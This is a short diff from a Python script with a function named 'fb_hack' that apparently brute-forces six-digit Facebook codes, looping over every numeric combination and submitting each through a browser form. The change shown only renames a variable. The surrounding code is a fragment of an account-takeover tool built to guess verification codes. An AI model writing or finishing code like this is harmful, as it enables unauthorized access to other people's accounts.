@@ -123,7 +123,7 @@ def fb_hack(email, codex):
     print(check2)
     attempt = int(codex)
     for combination in itertools.product(range(10), repeat=6):
-      x = (''.join(map(str, combination)))
+      y = (''.join(map(str, combination)))
       attempt += 1
       try:
         browser.select_form(nr=0)
